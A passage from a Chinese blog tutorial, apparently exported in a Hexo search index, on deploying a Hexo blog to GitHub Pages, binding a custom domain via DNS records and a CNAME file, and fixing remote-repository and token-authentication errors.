<p><strong>网站信息配置</strong><br>通过 <code>_config.yml</code> 修改配置</p>
<p>此处主要设置 <code>deploy</code>：即给 <code>hexo d</code> 进行配置告知 <code>hexo</code> 将 blog 部署在哪里</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">&#x27;git&#x27;</span></span><br><span class="line">  <span class="attr">repository:</span>  <span class="string">https://github.com/Yourname/Yourname.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure>
<p>安装部署插件，并部署</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br><span class="line"></span><br><span class="line">$ hexo clean <span class="comment"># 清除缓存</span></span><br><span class="line">$ hexo g <span class="comment"># 生成静态文件</span></span><br><span class="line">$ hexo d <span class="comment"># 部署网站</span></span><br><span class="line">....</span><br><span class="line">To https://github.com/Yourname/Yourname.github.io.git</span><br><span class="line"> * [new branch]      HEAD -&gt; master</span><br><span class="line">分支 <span class="string">&#x27;master&#x27;</span> 设置为跟踪来自 <span class="string">&#x27;https://github.com/Yourname/Yourname.github.io.git&#x27;</span> 的远程分支 <span class="string">&#x27;master&#x27;</span>。</span><br><span class="line">INFO  Deploy <span class="keyword">done</span>: git</span><br></pre></td></tr></table></figure>

<p><strong>绑定域名</strong><br>绑定域名需要三步</p>
<ol>
<li><p>在域名服务商修改解析记录集<br>我使用的华为云，设置 A 和 CNAME 记录如下图<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205021542680.png"><br>A 记录可以通过站长工具进行查询 <name>.github.io 的 ip 地址<br>注意：不能对同一个域名同时设置 A 记录和 CNAME 记录，会造成冲突</p>
</li>
<li><p>在 github 修改提供服务的域名<br>在 <name>.github.io 仓库中进行设置域名，<code>Settings-&gt;Pages-&gt;Custom domain</code>, 设置为自己的域名</p>
</li>
<li><p>在本地博客添加记录集文件 CNAME</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">emiyada.cn</span><br></pre></td></tr></table></figure></li>
</ol>
<p>重新部署</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo clean </span><br><span class="line">$ hexo g</span><br><span class="line">$ hexo d</span><br></pre></td></tr></table></figure>
<p>从浏览器打开页面可以看到<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205021540840.png"></p>
<h3 id="报错解决方式"><a href="#报错解决方式" class="headerlink" title="报错解决方式"></a>报错解决方式</h3><ol>
<li><p>无法读取远程仓库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fatal: <span class="string">&#x27;git@github.com/Yourname/Yourname.github.io.git&#x27;</span> does not appear to be a git repository</span><br><span class="line">fatal: 无法读取远程仓库。</span><br></pre></td></tr></table></figure>
<p>这里可能是由于将 deploy repo 设置成 git@ 连接方式，建议改成 https 连接</p>
</li>
<li><p>鉴权失败</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">remote: Please see https://github.blog/2020-12-15-token-authentication-requirements-for-git-operations/ <span class="keyword">for</span> more information.</span><br><span class="line">fatal: <span class="string">&#x27;https://github.com/Yourname/Yourname.github.io.git/&#x27;</span> 鉴权失败</span><br></pre></td></tr></table></figure>
<p>在部署的时候会提示输入用户名和密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Username for &#x27;https://github.com&#x27;:</span><br><span class="line">Password for &#x27;https://Yourname@github.com&#x27;:</span><br></pre></td></tr></table></figure>
<p>这里如果输入正常的github密码会报错鉴权失败，因为在2020年之后github修改成 token 认证机制</p>
</li>
</ol>
<p>token 可以通过 github 的 <code>Settings-&gt;Developer settings-&gt;Personal access tokens</code> 生成，并将其作为密码</p>
]]></content>
      <categories>
        <category>杂项</category>
      </categories>
      <tags>
        <tag>blog搭建</tag>
      </tags>
  </entry>
</search>
